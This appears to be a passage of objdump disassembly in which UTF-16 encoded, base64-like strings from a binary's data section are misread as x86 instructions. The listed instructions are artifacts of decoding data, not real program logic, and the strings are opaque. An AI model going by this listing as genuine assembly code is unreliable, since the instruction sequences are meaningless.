  40b413:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b416:	38 00                	cmp    %al,(%eax)
  40b418:	79 00                	jns    0x40b41a
  40b41a:	2f                   	das
  40b41b:	00 65 00             	add    %ah,0x0(%ebp)
  40b41e:	4e                   	dec    %esi
  40b41f:	00 36                	add    %dh,(%esi)
  40b421:	00 57 00             	add    %dl,0x0(%edi)
  40b424:	6f                   	outsl  %ds:(%esi),(%dx)
  40b425:	00 2f                	add    %ch,(%edi)
  40b427:	00 4b 00             	add    %cl,0x0(%ebx)
  40b42a:	39 00                	cmp    %eax,(%eax)
  40b42c:	39 00                	cmp    %eax,(%eax)
  40b42e:	56                   	push   %esi
  40b42f:	00 61 00             	add    %ah,0x0(%ecx)
  40b432:	6f                   	outsl  %ds:(%esi),(%dx)
  40b433:	00 46 00             	add    %al,0x0(%esi)
  40b436:	36 00 64 00 47       	add    %ah,%ss:0x47(%eax,%eax,1)
  40b43b:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40b43f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b442:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40b446:	33 00                	xor    (%eax),%eax
  40b448:	41                   	inc    %ecx
  40b449:	00 58 00             	add    %bl,0x0(%eax)
  40b44c:	44                   	inc    %esp
  40b44d:	00 51 00             	add    %dl,0x0(%ecx)
  40b450:	45                   	inc    %ebp
  40b451:	00 73 00             	add    %dh,0x0(%ebx)
  40b454:	39 00                	cmp    %eax,(%eax)
  40b456:	72 00                	jb     0x40b458
  40b458:	64 00 32             	add    %dh,%fs:(%edx)
  40b45b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b45e:	4f                   	dec    %edi
  40b45f:	00 36                	add    %dh,(%esi)
  40b461:	00 67 00             	add    %ah,0x0(%edi)
  40b464:	62 00                	bound  %eax,(%eax)
  40b466:	71 00                	jno    0x40b468
  40b468:	78 00                	js     0x40b46a
  40b46a:	58                   	pop    %eax
  40b46b:	00 73 00             	add    %dh,0x0(%ebx)
  40b46e:	48                   	dec    %eax
  40b46f:	00 76 00             	add    %dh,0x0(%esi)
  40b472:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40b476:	30 00                	xor    %al,(%eax)
  40b478:	38 00                	cmp    %al,(%eax)
  40b47a:	4c                   	dec    %esp
  40b47b:	00 77 00             	add    %dh,0x0(%edi)
  40b47e:	62 00                	bound  %eax,(%eax)
  40b480:	63 00                	arpl   %eax,(%eax)
  40b482:	51                   	push   %ecx
  40b483:	00 47 00             	add    %al,0x0(%edi)
  40b486:	79 00                	jns    0x40b488
  40b488:	4e                   	dec    %esi
  40b489:	00 65 00             	add    %ah,0x0(%ebp)
  40b48c:	33 00                	xor    (%eax),%eax
  40b48e:	43                   	inc    %ebx
  40b48f:	00 78 00             	add    %bh,0x0(%eax)
  40b492:	56                   	push   %esi
  40b493:	00 36                	add    %dh,(%esi)
  40b495:	00 6e 00             	add    %ch,0x0(%esi)
  40b498:	57                   	push   %edi
  40b499:	00 37                	add    %dh,(%edi)
  40b49b:	00 39                	add    %bh,(%ecx)
  40b49d:	00 6f 00             	add    %ch,0x0(%edi)
  40b4a0:	5a                   	pop    %edx
  40b4a1:	00 55 00             	add    %dl,0x0(%ebp)
  40b4a4:	61                   	popa
  40b4a5:	00 57 00             	add    %dl,0x0(%edi)
  40b4a8:	79 00                	jns    0x40b4aa
  40b4aa:	46                   	inc    %esi
  40b4ab:	00 78 00             	add    %bh,0x0(%eax)
  40b4ae:	61                   	popa
  40b4af:	00 38                	add    %bh,(%eax)
  40b4b1:	00 48 00             	add    %cl,0x0(%eax)
  40b4b4:	53                   	push   %ebx
  40b4b5:	00 58 00             	add    %bl,0x0(%eax)
  40b4b8:	6a 00                	push   $0x0
  40b4ba:	38 00                	cmp    %al,(%eax)
  40b4bc:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40b4c0:	6e                   	outsb  %ds:(%esi),(%dx)
  40b4c1:	00 55 00             	add    %dl,0x0(%ebp)
  40b4c4:	75 00                	jne    0x40b4c6
  40b4c6:	31 00                	xor    %eax,(%eax)
  40b4c8:	35 00 6a 00 4c       	xor    $0x4c006a00,%eax
  40b4cd:	00 6d 00             	add    %ch,0x0(%ebp)
  40b4d0:	49                   	dec    %ecx
  40b4d1:	00 36                	add    %dh,(%esi)
  40b4d3:	00 6b 00             	add    %ch,0x0(%ebx)
  40b4d6:	64 00 42 00          	add    %al,%fs:0x0(%edx)
  40b4da:	50                   	push   %eax
  40b4db:	00 45 00             	add    %al,0x0(%ebp)
  40b4de:	4d                   	dec    %ebp
  40b4df:	00 69 00             	add    %ch,0x0(%ecx)
  40b4e2:	47                   	inc    %edi
  40b4e3:	00 32                	add    %dh,(%edx)
  40b4e5:	00 55 00             	add    %dl,0x0(%ebp)
  40b4e8:	4b                   	dec    %ebx
  40b4e9:	00 2f                	add    %ch,(%edi)
  40b4eb:	00 4d 00             	add    %cl,0x0(%ebp)
  40b4ee:	78 00                	js     0x40b4f0
  40b4f0:	75 00                	jne    0x40b4f2
  40b4f2:	34 00                	xor    $0x0,%al
  40b4f4:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b4f8:	48                   	dec    %eax
  40b4f9:	00 49 00             	add    %cl,0x0(%ecx)
  40b4fc:	61                   	popa
  40b4fd:	00 48 00             	add    %cl,0x0(%eax)
  40b500:	75 00                	jne    0x40b502
  40b502:	68 00 47 00 6c       	push   $0x6c004700
  40b507:	00 6f 00             	add    %ch,0x0(%edi)
  40b50a:	77 00                	ja     0x40b50c
  40b50c:	34 00                	xor    $0x0,%al
  40b50e:	30 00                	xor    %al,(%eax)
  40b510:	6d                   	insl   (%dx),%es:(%edi)
  40b511:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  40b515:	00 36                	add    %dh,(%esi)
  40b517:	00 77 00             	add    %dh,0x0(%edi)
  40b51a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b51b:	00 44 00 4d          	add    %al,0x4d(%eax,%eax,1)
  40b51f:	00 73 00             	add    %dh,0x0(%ebx)
  40b522:	47                   	inc    %edi
  40b523:	00 4f 00             	add    %cl,0x0(%edi)
  40b526:	39 00                	cmp    %eax,(%eax)
  40b528:	76 00                	jbe    0x40b52a
  40b52a:	45                   	inc    %ebp
  40b52b:	00 45 00             	add    %al,0x0(%ebp)
  40b52e:	34 00                	xor    $0x0,%al
  40b530:	45                   	inc    %ebp
  40b531:	00 6d 00             	add    %ch,0x0(%ebp)
  40b534:	52                   	push   %edx
  40b535:	00 76 00             	add    %dh,0x0(%esi)
  40b538:	33 00                	xor    (%eax),%eax
  40b53a:	77 00                	ja     0x40b53c
  40b53c:	31 00                	xor    %eax,(%eax)
  40b53e:	4e                   	dec    %esi
  40b53f:	00 63 00             	add    %ah,0x0(%ebx)
  40b542:	65 00 31             	add    %dh,%gs:(%ecx)
  40b545:	00 73 00             	add    %dh,0x0(%ebx)
  40b548:	51                   	push   %ecx
  40b549:	00 46 00             	add    %al,0x0(%esi)
  40b54c:	4c                   	dec    %esp
  40b54d:	00 70 00             	add    %dh,0x0(%eax)
  40b550:	2b 00                	sub    (%eax),%eax
  40b552:	31 00                	xor    %eax,(%eax)
  40b554:	52                   	push   %edx
  40b555:	00 5a 00             	add    %bl,0x0(%edx)
  40b558:	54                   	push   %esp
  40b559:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40b55d:	00 58 00             	add    %bl,0x0(%eax)
  40b560:	70 00                	jo     0x40b562
  40b562:	76 00                	jbe    0x40b564
  40b564:	68 00 33 00 6a       	push   $0x6a003300
  40b569:	00 57 00             	add    %dl,0x0(%edi)
  40b56c:	38 00                	cmp    %al,(%eax)
  40b56e:	6d                   	insl   (%dx),%es:(%edi)
  40b56f:	00 41 00             	add    %al,0x0(%ecx)
  40b572:	39 00                	cmp    %eax,(%eax)
  40b574:	65 00 6a 00          	add    %ch,%gs:0x0(%edx)
  40b578:	53                   	push   %ebx
  40b579:	00 55 00             	add    %dl,0x0(%ebp)
  40b57c:	39 00                	cmp    %eax,(%eax)
  40b57e:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
  40b582:	47                   	inc    %edi
  40b583:	00 44 00 39          	add    %al,0x39(%eax,%eax,1)
  40b587:	00 6f 00             	add    %ch,0x0(%edi)
  40b58a:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  40b58e:	38 00                	cmp    %al,(%eax)
  40b590:	41                   	inc    %ecx
  40b591:	00 36                	add    %dh,(%esi)
  40b593:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  40b597:	00 44 00 57          	add    %al,0x57(%eax,%eax,1)
  40b59b:	00 65 00             	add    %ah,0x0(%ebp)
  40b59e:	47                   	inc    %edi
  40b59f:	00 45 00             	add    %al,0x0(%ebp)
  40b5a2:	61                   	popa
  40b5a3:	00 61 00             	add    %ah,0x0(%ecx)
  40b5a6:	77 00                	ja     0x40b5a8
  40b5a8:	54                   	push   %esp
  40b5a9:	00 50 00             	add    %dl,0x0(%eax)
  40b5ac:	5a                   	pop    %edx
  40b5ad:	00 52 00             	add    %dl,0x0(%edx)
  40b5b0:	46                   	inc    %esi
  40b5b1:	00 7a 00             	add    %bh,0x0(%edx)
  40b5b4:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40b5b8:	6c                   	insb   (%dx),%es:(%edi)
  40b5b9:	00 53 00             	add    %dl,0x0(%ebx)
  40b5bc:	44                   	inc    %esp
  40b5bd:	00 62 00             	add    %ah,0x0(%edx)
  40b5c0:	74 00                	je     0x40b5c2
  40b5c2:	79 00                	jns    0x40b5c4
  40b5c4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5c5:	00 66 00             	add    %ah,0x0(%esi)
  40b5c8:	57                   	push   %edi
  40b5c9:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5cc:	77 00                	ja     0x40b5ce
  40b5ce:	55                   	push   %ebp
  40b5cf:	00 4f 00             	add    %cl,0x0(%edi)
  40b5d2:	49                   	dec    %ecx
  40b5d3:	00 47 00             	add    %al,0x0(%edi)
  40b5d6:	62 00                	bound  %eax,(%eax)
  40b5d8:	59                   	pop    %ecx
  40b5d9:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b5dd:	00 48 00             	add    %cl,0x0(%eax)
  40b5e0:	74 00                	je     0x40b5e2
  40b5e2:	61                   	popa
  40b5e3:	00 6b 00             	add    %ch,0x0(%ebx)
  40b5e6:	2f                   	das
  40b5e7:	00 49 00             	add    %cl,0x0(%ecx)
  40b5ea:	51                   	push   %ecx
  40b5eb:	00 54 00 58          	add    %dl,0x58(%eax,%eax,1)
  40b5ef:	00 33                	add    %dh,(%ebx)
  40b5f1:	00 58 00             	add    %bl,0x0(%eax)
  40b5f4:	47                   	inc    %edi
  40b5f5:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5f8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5f9:	00 79 00             	add    %bh,0x0(%ecx)
  40b5fc:	70 00                	jo     0x40b5fe
  40b5fe:	34 00                	xor    $0x0,%al
  40b600:	6c                   	insb   (%dx),%es:(%edi)
  40b601:	00 4a 00             	add    %cl,0x0(%edx)
  40b604:	4f                   	dec    %edi
  40b605:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40b609:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b60c:	4f                   	dec    %edi
  40b60d:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40b611:	00 6f 00             	add    %ch,0x0(%edi)
  40b614:	53                   	push   %ebx
  40b615:	00 31                	add    %dh,(%ecx)
  40b617:	00 76 00             	add    %dh,0x0(%esi)
  40b61a:	62 00                	bound  %eax,(%eax)
  40b61c:	74 00                	je     0x40b61e
  40b61e:	51                   	push   %ecx
  40b61f:	00 71 00             	add    %dh,0x0(%ecx)
  40b622:	33 00                	xor    (%eax),%eax
  40b624:	30 00                	xor    %al,(%eax)
  40b626:	4a                   	dec    %edx
  40b627:	00 49 00             	add    %cl,0x0(%ecx)
  40b62a:	2b 00                	sub    (%eax),%eax
  40b62c:	2b 00                	sub    (%eax),%eax
  40b62e:	6a 00                	push   $0x0
  40b630:	66 00 54 00 54       	data16 add %dl,0x54(%eax,%eax,1)
  40b635:	00 73 00             	add    %dh,0x0(%ebx)
  40b638:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40b63c:	4b                   	dec    %ebx
  40b63d:	00 52 00             	add    %dl,0x0(%edx)
  40b640:	55                   	push   %ebp
  40b641:	00 37                	add    %dh,(%edi)
  40b643:	00 49 00             	add    %cl,0x0(%ecx)
  40b646:	31 00                	xor    %eax,(%eax)
  40b648:	75 00                	jne    0x40b64a
  40b64a:	58                   	pop    %eax
  40b64b:	00 2f                	add    %ch,(%edi)
  40b64d:	00 6c 00 34          	add    %ch,0x34(%eax,%eax,1)
  40b651:	00 72 00             	add    %dh,0x0(%edx)
  40b654:	74 00                	je     0x40b656
  40b656:	43                   	inc    %ebx
  40b657:	00 62 00             	add    %ah,0x0(%edx)
  40b65a:	49                   	dec    %ecx
  40b65b:	00 61 00             	add    %ah,0x0(%ecx)
  40b65e:	43                   	inc    %ebx
  40b65f:	00 4b 00             	add    %cl,0x0(%ebx)
  40b662:	67 00 3d             	add    %bh,(%di)
  40b665:	00 00                	add    %al,(%eax)
  40b667:	87 b1 76 00 68 00    	xchg   %esi,0x680076(%ecx)
  40b66d:	6d                   	insl   (%dx),%es:(%edi)
  40b66e:	00 78 00             	add    %bh,0x0(%eax)
  40b671:	34 00                	xor    $0x0,%al
  40b673:	44                   	inc    %esp
  40b674:	00 6c 00 30          	add    %ch,0x30(%eax,%eax,1)
  40b678:	00 78 00             	add    %bh,0x0(%eax)
  40b67b:	36 00 58 00          	add    %bl,%ss:0x0(%eax)
  40b67f:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40b683:	75 00                	jne    0x40b685
  40b685:	52                   	push   %edx
  40b686:	00 42 00             	add    %al,0x0(%edx)
  40b689:	37                   	aaa
  40b68a:	00 35 00 6e 00 5a    	add    %dh,0x5a006e00
  40b690:	00 56 00             	add    %dl,0x0(%esi)
  40b693:	51                   	push   %ecx
  40b694:	00 36                	add    %dh,(%esi)
  40b696:	00 48 00             	add    %cl,0x0(%eax)
  40b699:	31 00                	xor    %eax,(%eax)
  40b69b:	79 00                	jns    0x40b69d
  40b69d:	62 00                	bound  %eax,(%eax)
  40b69f:	73 00                	jae    0x40b6a1
  40b6a1:	4c                   	dec    %esp
  40b6a2:	00 69 00             	add    %ch,0x0(%ecx)
  40b6a5:	78 00                	js     0x40b6a7
  40b6a7:	74 00                	je     0x40b6a9
  40b6a9:	66 00 2b             	data16 add %ch,(%ebx)
  40b6ac:	00 6b 00             	add    %ch,0x0(%ebx)
  40b6af:	30 00                	xor    %al,(%eax)
  40b6b1:	57                   	push   %edi
  40b6b2:	00 66 00             	add    %ah,0x0(%esi)
  40b6b5:	47                   	inc    %edi
  40b6b6:	00 35 00 42 00 33    	add    %dh,0x33004200
  40b6bc:	00 7a 00             	add    %bh,0x0(%edx)
  40b6bf:	55                   	push   %ebp
  40b6c0:	00 55 00             	add    %dl,0x0(%ebp)
  40b6c3:	47                   	inc    %edi
  40b6c4:	00 67 00             	add    %ah,0x0(%edi)
  40b6c7:	6d                   	insl   (%dx),%es:(%edi)
  40b6c8:	00 78 00             	add    %bh,0x0(%eax)
  40b6cb:	61                   	popa
  40b6cc:	00 76 00             	add    %dh,0x0(%esi)
  40b6cf:	77 00                	ja     0x40b6d1
  40b6d1:	33 00                	xor    (%eax),%eax
  40b6d3:	51                   	push   %ecx
  40b6d4:	00 46 00             	add    %al,0x0(%esi)
  40b6d7:	49                   	dec    %ecx
  40b6d8:	00 74 00 7a          	add    %dh,0x7a(%eax,%eax,1)
  40b6dc:	00 62 00             	add    %ah,0x0(%edx)
  40b6df:	2b 00                	sub    (%eax),%eax
  40b6e1:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40b6e5:	39 00                	cmp    %eax,(%eax)
  40b6e7:	2f                   	das
  40b6e8:	00 66 00             	add    %ah,0x0(%esi)
  40b6eb:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40b6ef:	63 00                	arpl   %eax,(%eax)
  40b6f1:	54                   	push   %esp
  40b6f2:	00 76 00             	add    %dh,0x0(%esi)
  40b6f5:	34 00                	xor    $0x0,%al
  40b6f7:	49                   	dec    %ecx
  40b6f8:	00 43 00             	add    %al,0x0(%ebx)
  40b6fb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b6fc:	00 7a 00             	add    %bh,0x0(%edx)
  40b6ff:	35 00 44 00 72       	xor    $0x72004400,%eax
  40b704:	00 49 00             	add    %cl,0x0(%ecx)
  40b707:	59                   	pop    %ecx
  40b708:	00 58 00             	add    %bl,0x0(%eax)
  40b70b:	45                   	inc    %ebp
  40b70c:	00 43 00             	add    %al,0x0(%ebx)
  40b70f:	76 00                	jbe    0x40b711
  40b711:	4d                   	dec    %ebp
  40b712:	00 49 00             	add    %cl,0x0(%ecx)
  40b715:	77 00                	ja     0x40b717
  40b717:	78 00                	js     0x40b719
  40b719:	70 00                	jo     0x40b71b
  40b71b:	77 00                	ja     0x40b71d
  40b71d:	67 00 45 00          	add    %al,0x0(%di)
  40b721:	5a                   	pop    %edx
  40b722:	00 2b                	add    %ch,(%ebx)
  40b724:	00 69 00             	add    %ch,0x0(%ecx)
  40b727:	37                   	aaa
  40b728:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40b72c:	00 4b 00             	add    %cl,0x0(%ebx)
  40b72f:	73 00                	jae    0x40b731
  40b731:	48                   	dec    %eax
  40b732:	00 6f 00             	add    %ch,0x0(%edi)
  40b735:	58                   	pop    %eax
  40b736:	00 51 00             	add    %dl,0x0(%ecx)
  40b739:	57                   	push   %edi
  40b73a:	00 38                	add    %bh,(%eax)
  40b73c:	00 7a 00             	add    %bh,0x0(%edx)
  40b73f:	2b 00                	sub    (%eax),%eax
  40b741:	65 00 65 00          	add    %ah,%gs:0x0(%ebp)
  40b745:	32 00                	xor    (%eax),%al
  40b747:	4f                   	dec    %edi
  40b748:	00 4d 00             	add    %cl,0x0(%ebp)
  40b74b:	49                   	dec    %ecx
  40b74c:	00 78 00             	add    %bh,0x0(%eax)
  40b74f:	54                   	push   %esp
  40b750:	00 76 00             	add    %dh,0x0(%esi)
  40b753:	6a 00                	push   $0x0
  40b755:	4d                   	dec    %ebp
  40b756:	00 52 00             	add    %dl,0x0(%edx)
  40b759:	4a                   	dec    %edx
  40b75a:	00 6a 00             	add    %ch,0x0(%edx)
  40b75d:	32 00                	xor    (%eax),%al
  40b75f:	7a 00                	jp     0x40b761
  40b761:	48                   	dec    %eax
  40b762:	00 79 00             	add    %bh,0x0(%ecx)
  40b765:	56                   	push   %esi
  40b766:	00 42 00             	add    %al,0x0(%edx)
  40b769:	76 00                	jbe    0x40b76b
  40b76b:	4e                   	dec    %esi
  40b76c:	00 57 00             	add    %dl,0x0(%edi)
  40b76f:	4f                   	dec    %edi
  40b770:	00 6e 00             	add    %ch,0x0(%esi)
  40b773:	69 00 76 00 37 00    	imul   $0x370076,(%eax),%eax
  40b779:	4d                   	dec    %ebp
  40b77a:	00 57 00             	add    %dl,0x0(%edi)
  40b77d:	53                   	push   %ebx
  40b77e:	00 36                	add    %dh,(%esi)
  40b780:	00 4b 00             	add    %cl,0x0(%ebx)
  40b783:	4f                   	dec    %edi
  40b784:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b787:	75 00                	jne    0x40b789
  40b789:	44                   	inc    %esp
  40b78a:	00 49 00             	add    %cl,0x0(%ecx)
  40b78d:	43                   	inc    %ebx
  40b78e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b791:	32 00                	xor    (%eax),%al
  40b793:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b797:	76 00                	jbe    0x40b799
  40b799:	48                   	dec    %eax
  40b79a:	00 4f 00             	add    %cl,0x0(%edi)
  40b79d:	78 00                	js     0x40b79f
  40b79f:	31 00                	xor    %eax,(%eax)
  40b7a1:	46                   	inc    %esi
  40b7a2:	00 57 00             	add    %dl,0x0(%edi)
  40b7a5:	42                   	inc    %edx
  40b7a6:	00 2f                	add    %ch,(%edi)
  40b7a8:	00 32                	add    %dh,(%edx)
  40b7aa:	00 32                	add    %dh,(%edx)
  40b7ac:	00 6f 00             	add    %ch,0x0(%edi)
  40b7af:	4d                   	dec    %ebp
  40b7b0:	00 75 00             	add    %dh,0x0(%ebp)
  40b7b3:	2f                   	das
  40b7b4:	00 71 00             	add    %dh,0x0(%ecx)
  40b7b7:	73 00                	jae    0x40b7b9
  40b7b9:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7ba:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40b7be:	00 79 00             	add    %bh,0x0(%ecx)
  40b7c1:	72 00                	jb     0x40b7c3
  40b7c3:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40b7c7:	4a                   	dec    %edx
  40b7c8:	00 46 00             	add    %al,0x0(%esi)
  40b7cb:	46                   	inc    %esi
  40b7cc:	00 59 00             	add    %bl,0x0(%ecx)
  40b7cf:	79 00                	jns    0x40b7d1
  40b7d1:	6b 00 57             	imul   $0x57,(%eax),%eax
  40b7d4:	00 4b 00             	add    %cl,0x0(%ebx)
  40b7d7:	43                   	inc    %ebx
  40b7d8:	00 72 00             	add    %dh,0x0(%edx)
  40b7db:	74 00                	je     0x40b7dd
  40b7dd:	53                   	push   %ebx
  40b7de:	00 69 00             	add    %ch,0x0(%ecx)
  40b7e1:	4f                   	dec    %edi
  40b7e2:	00 35 00 4d 00 77    	add    %dh,0x77004d00
  40b7e8:	00 48 00             	add    %cl,0x0(%eax)
  40b7eb:	4d                   	dec    %ebp
  40b7ec:	00 38                	add    %bh,(%eax)
  40b7ee:	00 41 00             	add    %al,0x0(%ecx)
  40b7f1:	6c                   	insb   (%dx),%es:(%edi)
  40b7f2:	00 37                	add    %dh,(%edi)
  40b7f4:	00 47 00             	add    %al,0x0(%edi)
  40b7f7:	4a                   	dec    %edx
  40b7f8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b7fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7fc:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  40b800:	00 2b                	add    %ch,(%ebx)
  40b802:	00 4f 00             	add    %cl,0x0(%edi)
  40b805:	76 00                	jbe    0x40b807
  40b807:	74 00                	je     0x40b809
  40b809:	7a 00                	jp     0x40b80b
  40b80b:	6f                   	outsl  %ds:(%esi),(%dx)
  40b80c:	00 76 00             	add    %dh,0x0(%esi)
  40b80f:	68 00 5a 00 6f       	push   $0x6f005a00
  40b814:	00 31                	add    %dh,(%ecx)
  40b816:	00 48 00             	add    %cl,0x0(%eax)
  40b819:	58                   	pop    %eax
  40b81a:	00 39                	add    %bh,(%ecx)
  40b81c:	00 72 00             	add    %dh,0x0(%edx)
  40b81f:	46                   	inc    %esi
  40b820:	00 54 00 50          	add    %dl,0x50(%eax,%eax,1)
  40b824:	00 70 00             	add    %dh,0x0(%eax)
  40b827:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40b82b:	66 00 57 00          	data16 add %dl,0x0(%edi)
  40b82f:	4d                   	dec    %ebp
  40b830:	00 7a 00             	add    %bh,0x0(%edx)
  40b833:	4b                   	dec    %ebx
  40b834:	00 39                	add    %bh,(%ecx)
  40b836:	00 54 00 77          	add    %dl,0x77(%eax,%eax,1)
  40b83a:	00 6a 00             	add    %ch,0x0(%edx)
  40b83d:	46                   	inc    %esi
  40b83e:	00 66 00             	add    %ah,0x0(%esi)
  40b841:	75 00                	jne    0x40b843
  40b843:	4c                   	dec    %esp
  40b844:	00 79 00             	add    %bh,0x0(%ecx)
  40b847:	33 00                	xor    (%eax),%eax
  40b849:	51                   	push   %ecx
  40b84a:	00 36                	add    %dh,(%esi)
  40b84c:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
  40b850:	00 78 00             	add    %bh,0x0(%eax)
  40b853:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  40b857:	32 00                	xor    (%eax),%al
  40b859:	31 00                	xor    %eax,(%eax)
  40b85b:	79 00                	jns    0x40b85d
  40b85d:	4f                   	dec    %edi
  40b85e:	00 79 00             	add    %bh,0x0(%ecx)
  40b861:	6b 00 37             	imul   $0x37,(%eax),%eax
  40b864:	00 6d 00             	add    %ch,0x0(%ebp)
  40b867:	47                   	inc    %edi
  40b868:	00 46 00             	add    %al,0x0(%esi)
  40b86b:	69 00 44 00 62 00    	imul   $0x620044,(%eax),%eax
  40b871:	53                   	push   %ebx
  40b872:	00 36                	add    %dh,(%esi)
  40b874:	00 69 00             	add    %ch,0x0(%ecx)
  40b877:	42                   	inc    %edx
  40b878:	00 4d 00             	add    %cl,0x0(%ebp)
  40b87b:	34 00                	xor    $0x0,%al
  40b87d:	52                   	push   %edx
  40b87e:	00 2f                	add    %ch,(%edi)
  40b880:	00 33                	add    %dh,(%ebx)
  40b882:	00 61 00             	add    %ah,0x0(%ecx)
  40b885:	48                   	dec    %eax
  40b886:	00 43 00             	add    %al,0x0(%ebx)
  40b889:	62 00                	bound  %eax,(%eax)
  40b88b:	49                   	dec    %ecx
  40b88c:	00 57 00             	add    %dl,0x0(%edi)
  40b88f:	4b                   	dec    %ebx
  40b890:	00 35 00 70 00 63    	add    %dh,0x63007000
  40b896:	00 39                	add    %bh,(%ecx)
  40b898:	00 2f                	add    %ch,(%edi)
  40b89a:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b89d:	6b 00 76             	imul   $0x76,(%eax),%eax
  40b8a0:	00 64 00 78          	add    %ah,0x78(%eax,%eax,1)
  40b8a4:	00 43 00             	add    %al,0x0(%ebx)
  40b8a7:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  40b8ac:	00 35 00 55 00 6e    	add    %dh,0x6e005500
  40b8b2:	00 6a 00             	add    %ch,0x0(%edx)
  40b8b5:	44                   	inc    %esp
  40b8b6:	00 68 00             	add    %ch,0x0(%eax)
  40b8b9:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  40b8bd:	49                   	dec    %ecx
  40b8be:	00 33                	add    %dh,(%ebx)
  40b8c0:	00 4f 00             	add    %cl,0x0(%edi)
  40b8c3:	63 00                	arpl   %eax,(%eax)
  40b8c5:	4a                   	dec    %edx
  40b8c6:	00 47 00             	add    %al,0x0(%edi)
  40b8c9:	32 00                	xor    (%eax),%al
  40b8cb:	47                   	inc    %edi
  40b8cc:	00 58 00             	add    %bl,0x0(%eax)
  40b8cf:	35 00 6a 00 44       	xor    $0x44006a00,%eax
  40b8d4:	00 33                	add    %dh,(%ebx)
  40b8d6:	00 68 00             	add    %ch,0x0(%eax)
  40b8d9:	51                   	push   %ecx
  40b8da:	00 38                	add    %bh,(%eax)
  40b8dc:	00 33                	add    %dh,(%ebx)
  40b8de:	00 73 00             	add    %dh,0x0(%ebx)
  40b8e1:	4e                   	dec    %esi
  40b8e2:	00 56 00             	add    %dl,0x0(%esi)
  40b8e5:	58                   	pop    %eax
  40b8e6:	00 77 00             	add    %dh,0x0(%edi)
  40b8e9:	4b                   	dec    %ebx
  40b8ea:	00 75 00             	add    %dh,0x0(%ebp)
  40b8ed:	58                   	pop    %eax
  40b8ee:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40b8f2:	00 74 00 63          	add    %dh,0x63(%eax,%eax,1)
  40b8f6:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40b8fa:	00 52 00             	add    %dl,0x0(%edx)
  40b8fd:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40b900:	00 72 00             	add    %dh,0x0(%edx)
  40b903:	36 00 55 00          	add    %dl,%ss:0x0(%ebp)
  40b907:	30 00                	xor    %al,(%eax)
  40b909:	4b                   	dec    %ebx
  40b90a:	00 76 00             	add    %dh,0x0(%esi)
  40b90d:	72 00                	jb     0x40b90f
  40b90f:	32 00                	xor    (%eax),%al
  40b911:	6e                   	outsb  %ds:(%esi),(%dx)
  40b912:	00 45 00             	add    %al,0x0(%ebp)
  40b915:	63 00                	arpl   %eax,(%eax)
  40b917:	34 00                	xor    $0x0,%al
  40b919:	37                   	aaa
  40b91a:	00 6f 00             	add    %ch,0x0(%edi)
  40b91d:	41                   	inc    %ecx
  40b91e:	00 4a 00             	add    %cl,0x0(%edx)
  40b921:	6c                   	insb   (%dx),%es:(%edi)
  40b922:	00 66 00             	add    %ah,0x0(%esi)
  40b925:	52                   	push   %edx
  40b926:	00 69 00             	add    %ch,0x0(%ecx)
  40b929:	51                   	push   %ecx
  40b92a:	00 2b                	add    %ch,(%ebx)
  40b92c:	00 39                	add    %bh,(%ecx)
  40b92e:	00 6d 00             	add    %ch,0x0(%ebp)
  40b931:	79 00                	jns    0x40b933
  40b933:	6d                   	insl   (%dx),%es:(%edi)
  40b934:	00 5a 00             	add    %bl,0x0(%edx)
  40b937:	36 00 39             	add    %bh,%ss:(%ecx)
  40b93a:	00 36                	add    %dh,(%esi)
  40b93c:	00 72 00             	add    %dh,0x0(%edx)
  40b93f:	39 00                	cmp    %eax,(%eax)
  40b941:	49                   	dec    %ecx
  40b942:	00 49 00             	add    %cl,0x0(%ecx)
  40b945:	44                   	inc    %esp
  40b946:	00 42 00             	add    %al,0x0(%edx)
  40b949:	75 00                	jne    0x40b94b
  40b94b:	72 00                	jb     0x40b94d
  40b94d:	41                   	inc    %ecx
  40b94e:	00 6e 00             	add    %ch,0x0(%esi)
  40b951:	79 00                	jns    0x40b953
